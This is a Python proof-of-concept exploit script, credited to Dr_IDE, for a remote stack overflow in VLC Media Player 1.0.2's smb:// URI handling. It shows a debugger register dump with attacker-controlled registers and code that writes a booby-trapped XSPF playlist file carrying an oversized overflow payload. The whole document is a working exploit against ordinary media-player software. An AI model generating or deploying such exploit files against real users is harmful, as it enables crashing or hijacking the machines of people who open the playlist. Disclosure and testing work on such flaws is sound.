##########################################################################################################
#
# VLC Media Player 1.0.2 smb:// URI Handling Remote Stack Overflow PoC
# Found By:	Dr_IDE
# Tested:	Windows XP SP2 , XP SP3 and Windows 7 RC1 with VLC 1.0.2 "Goldeneye"
# Download:	http://majorgeeks.com/downloadget.php?id=4674&file=1&evp=a87d1b50269ba27878899d30ec7cd947
#
##########################################################################################################

# XPSP3 Crash 
"""
EAX FFFFFFFE
ECX 42424242        <--------- w00t!
EDX 00000000
EBX 42424242
ESP 02EAF694
EBP 02EAF7C4
ESI 61CC8324 libacc_4.61CC8324
EDI 61CC8323 libacc_4.61CC8323
EIP 77C478AC msvcrt.77C478AC
C 0  ES 0023 32bit 0(FFFFFFFF)
P 0  CS 001B 32bit 0(FFFFFFFF)
A 0  SS 0023 32bit 0(FFFFFFFF)
Z 0  DS 0023 32bit 0(FFFFFFFF)
S 0  FS 003B 32bit 7FFAC000(FFF)
T 0  GS 0000 NULL
D 0
O 0  LastErr ERROR_MOD_NOT_FOUND (0000007E)
EFL 00010202 (NO,NB,NE,A,NS,PO,GE,G)
ST0 empty -UNORM FB18 0184A1C0 00AD4518
ST1 empty +UNORM 2088 00000000 00000000
ST2 empty 0.3987488760738806780e-4933
ST3 empty -??? FFFF 00000000 77C2C42E
ST4 empty +UNORM 0B10 00B094E8 00000000
ST5 empty 0.3987486256431287370e-4933
ST6 empty 0.0
ST7 empty -0.2650710894356302916
               3 2 1 0      E S P U O Z D I
FST 0020  Cond 0 0 0 0  Err 0 0 1 0 0 0 0 0  (GT)
FCW 027F  Prec NEAR,53  Mask    1 1 1 1 1 1

"""
header1 =  ("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n")
header1 += ("<playlist version=\"1\" xmlns=\"http://xspf.org/ns/0/\" xmlns:vlc=\"http://www.videolan.org/vlc/playlist/ns/0/\">\n")
header1 += ("\t<title>Playlist</title>\n")
header1 += ("\t<trackList>\n")
header1 += ("\t\t<track>\n")
header1 += ("\t\t\t<location>smb://example.com@www.example.com/foo/#{")

payload = ("\x41" * 2 + "\x42" * 4 + "\x43" * 10000)

header2 =  ("}</location>\n");
header2 += ("\t\t\t<extension application=\"http://www.videolan.org/vlc/playlist/0\">\n");
header2 += ("\t\t\t\t<vlc:id>0</vlc:id>\n");
header2 += ("\t\t\t</extension>\n");
header2 += ("\t\t</track>\n");
header2 += ("\t</trackList>\n");
header2 += ("</playlist>\n");

try:
    f1 = open("vlc_1.0.2.xspf","w")
    f1.write(header1 + payload + header2)
    f1.close()
    print("\nExploit file created!\n")
except:
    print "Error"